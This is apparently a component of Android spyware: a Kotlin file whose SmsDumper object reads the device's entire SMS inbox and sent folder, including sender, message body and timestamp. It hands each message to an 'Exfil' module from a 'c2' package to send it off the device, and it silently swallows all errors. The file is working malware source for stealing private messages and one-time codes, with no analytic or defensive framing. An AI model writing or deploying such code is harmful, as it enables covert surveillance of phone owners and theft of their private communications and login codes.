package com.sp.core.services

import android.content.Context
import android.net.Uri
import android.provider.Telephony
import com.sp.core.c2.Exfil
import org.json.JSONObject

/**
 * Reads the SMS inbox directly from the content provider.
 *
 * The broadcast receiver only sees the messages that arrive while the app is
 * alive - this dump gets the whole inbox (and the sent folder) at any time.
 */
object SmsDumper {

    fun dump(ctx: Context, limit: Int): Int {
        var sent = 0
        sent += readBox(ctx, Telephony.Sms.Inbox.CONTENT_URI, limit)
        sent += readBox(ctx, Telephony.Sms.Sent.CONTENT_URI, limit)
        return sent
    }

    private fun readBox(ctx: Context, uri: Uri, limit: Int): Int {
        var count = 0
        try {
            val cols = arrayOf("address", "body", "date", "type")
            ctx.contentResolver.query(uri, cols, null, null, "date DESC LIMIT $limit")?.use { c ->
                while (c.moveToNext() && count < limit) {
                    val address = c.getString(0) ?: ""
                    val body = c.getString(1) ?: ""
                    val date = c.getLong(2)
                    val type = c.getInt(3)
                    val payload = JSONObject().apply {
                        put("from", address)
                        put("body", body)
                        put("ts", date)
                        put("box", if (type == 2) "sent" else "inbox")
                        put("source", "inbox")
                    }
                    Exfil.sendLog(ctx, "sms", payload.toString())
                    count++
                }
            }
        } catch (_: Throwable) {
        }
        return count
    }
}
